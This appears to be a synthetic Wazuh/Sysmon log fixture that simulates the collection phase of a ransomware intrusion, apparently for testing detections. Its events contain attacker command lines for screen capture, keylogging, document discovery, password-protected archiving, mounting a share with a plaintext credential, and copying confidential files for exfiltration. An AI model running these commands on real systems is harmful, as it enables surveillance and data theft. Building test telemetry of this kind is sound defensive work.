@@ -1,0 +1,321 @@
+{
+  "_metadata": {
+    "engagement": "ransomware",
+    "phase": "collection",
+    "phase_number": 8,
+    "description": "Collection phase of Ransomware - example-corp",
+    "techniques": [
+      "T1560.001",
+      "T1056.001",
+      "T1005",
+      "T1113",
+      "T1039"
+    ],
+    "timespan": "T+7:44:00 to T+8:06:30",
+    "attacker_logic": "Attacker executes collection techniques",
+    "format": "wazuh-native",
+    "format_version": "2.0"
+  },
+  "attacker_profile": {
+    "c2_server": "185.141.27.98",
+    "initial_target": "WS01.corp.local",
+    "compromised_user": "CORP\\jsmith"
+  },
+  "logs": [
+    {
+      "_comment": "Screenshot capture via PowerShell",
+      "sequence": 1,
+      "relative_time": "T+7:44:00",
+      "timestamp": "2026-01-30T15:44:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size); $bitmap.Save('C:\\Users\\Public\\screenshot.png')}",
+            "ScriptBlockId": "{C257A465-FS01-0042-E4127099EC97}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:44:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Screenshot file created",
+      "sequence": 2,
+      "relative_time": "T+7:45:00",
+      "timestamp": "2026-01-30T15:45:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 11,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:09.330",
+            "ProcessGuid": "{C257A465-FS01-0042-E4127099EC97}",
+            "ProcessId": "5227",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TargetFilename": "C:\\Users\\Public\\screenshot.png",
+            "CreationUtcTime": "2026-01-30 12:03:09.330",
+            "User": "EXAMPLE\\jsmith"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:45:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Keylogger execution",
+      "sequence": 3,
+      "relative_time": "T+7:46:30",
+      "timestamp": "2026-01-30T15:46:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:18.603",
+            "ProcessGuid": "{C257A465-FS01-0043-57F5AAC70C26}",
+            "ProcessId": "5369",
+            "Image": "C:\\Users\\Public\\keylog.exe",
+            "CommandLine": "keylog.exe -o C:\\Users\\Public\\keystrokes.log",
+            "CurrentDirectory": "C:\\Users\\Public\\",
+            "User": "EXAMPLE\\mjones",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12345678",
+            "ParentProcessGuid": "{C257A465-FS01-0042-E4127099EC97}",
+            "ParentProcessId": "5227",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:46:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "PowerShell keylogger API call",
+      "sequence": 4,
+      "relative_time": "T+7:48:30",
+      "timestamp": "2026-01-30T15:48:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "$API = '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);'; Add-Type -MemberDefinition $API -Name Keyboard -Namespace PsKeyLogger",
+            "ScriptBlockId": "{C257A465-FS01-0044-A114764B221C}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:48:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Local data discovery",
+      "sequence": 5,
+      "relative_time": "T+7:51:00",
+      "timestamp": "2026-01-30T15:51:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:23.999",
+            "ProcessGuid": "{C257A465-FS01-0045-C71AC3A39EE5}",
+            "ProcessId": "5561",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c dir /s /b C:\\Users\\*.docx C:\\Users\\*.xlsx C:\\Users\\*.pdf > C:\\temp\\files.txt",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-FS01-0044-A114764B221C}",
+            "ParentProcessId": "5426",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:51:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Archive collected data with password",
+      "sequence": 6,
+      "relative_time": "T+7:54:00",
+      "timestamp": "2026-01-30T15:54:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:27.589",
+            "ProcessGuid": "{C257A465-FS01-0046-42C7B4DF1960}",
+            "ProcessId": "5607",
+            "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+            "CommandLine": "7z.exe a -pinfected C:\\temp\\data.7z @C:\\temp\\files.txt",
+            "CurrentDirectory": "C:\\Program Files\\7-Zip\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-FS01-0045-C71AC3A39EE5}",
+            "ParentProcessId": "5561",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:54:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Network share connection",
+      "sequence": 7,
+      "relative_time": "T+7:57:30",
+      "timestamp": "2026-01-30T15:57:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:29.496",
+            "ProcessGuid": "{C257A465-FS01-0047-3B70A96B86EE}",
+            "ProcessId": "5706",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net use Z: \\\\FILESERVER\\shared /user:CORP\\admin.svc P@ssw0rd123",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-FS01-0046-42C7B4DF1960}",
+            "ParentProcessId": "5607",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T15:57:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Network share data collection via robocopy",
+      "sequence": 8,
+      "relative_time": "T+8:01:30",
+      "timestamp": "2026-01-30T16:01:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:31.095",
+            "ProcessGuid": "{C257A465-FS01-0048-F5CD30AFC3AD}",
+            "ProcessId": "5888",
+            "Image": "C:\\Windows\\System32\\robocopy.exe",
+            "CommandLine": "robocopy Z:\\confidential C:\\temp\\exfil /E /R:1 /W:1",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-FS01-0047-3B70A96B86EE}",
+            "ParentProcessId": "5706",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T16:01:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    },
+    {
+      "_comment": "Archive data for exfiltration",
+      "sequence": 9,
+      "relative_time": "T+8:06:00",
+      "timestamp": "2026-01-30T16:06:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:03:41.023",
+            "ProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ProcessId": "5943",
+            "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+            "CommandLine": "7z.exe a -p\"exfil2026\" C:\\Users\\Public\\data.7z C:\\Users\\*\\Documents\\*",
+            "User": "EXAMPLE\\jsmith",
+            "ParentProcessGuid": "{C257A465-FS01-0048-F5CD30AFC3AD}"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T16:06:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "collection"
+      }
+    }
+  ]
+}
